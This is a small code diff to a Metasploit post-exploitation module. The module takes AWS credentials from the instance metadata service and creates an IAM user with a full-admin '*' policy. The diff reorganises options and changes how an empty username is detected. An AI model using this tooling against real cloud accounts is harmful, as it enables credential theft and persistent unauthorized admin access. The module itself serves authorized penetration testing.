@@ -23,19 +23,19 @@ class MetasploitModule < Msf::Post
 
     register_options(
       [
-        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
-        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
-        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
-        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
-        OptString.new('IAM_USERNAME', [false, 'Username for the user to be created', '']),
-        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
+        OptString.new('IAM_USERNAME', [false, 'Name of the user to be created (leave empty or unset to use a random name)', ''])
       ])
     register_advanced_options(
       [
         OptString.new('METADATA_IP', [true, 'The metadata service IP', '169.254.169.254']),
         OptString.new('AccessKeyId', [false, 'AWS access key', '']),
         OptString.new('SecretAccessKey', [false, 'AWS secret key', '']),
-        OptString.new('Token', [false, 'AWS session token', ''])
+        OptString.new('Token', [false, 'AWS session token', '']),
+        OptString.new('RHOST', [true, 'AWS IAM Endpoint', 'iam.amazonaws.com']),
+        OptString.new('RPORT', [true, 'AWS IAM Endpoint TCP Port', 443]),
+        OptString.new('SSL', [true, 'AWS IAM Endpoint SSL', true]),
+        OptString.new('IAM_GROUP_POL', [true, 'IAM group policy to use', '{"Version": "2012-10-17", "Statement": [{"Effect": "Allow", "Action": "*", "Resource": "*" }]}']),
+        OptString.new('Region', [true, 'The default region', 'us-east-1' ])
       ])
     deregister_options('VHOST')
   end
@@ -58,7 +58,7 @@ class MetasploitModule < Msf::Post
     end
 
     # create user
-    username = datastore['IAM_USERNAME'].empty? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
+    username = datastore['IAM_USERNAME'].blank? ? Rex::Text.rand_text_alphanumeric(16) : datastore['IAM_USERNAME']
     print_status("Creating user: #{username}")
     action = 'CreateUser'
     doc = call_iam(creds, 'Action' => action, 'UserName' => username)
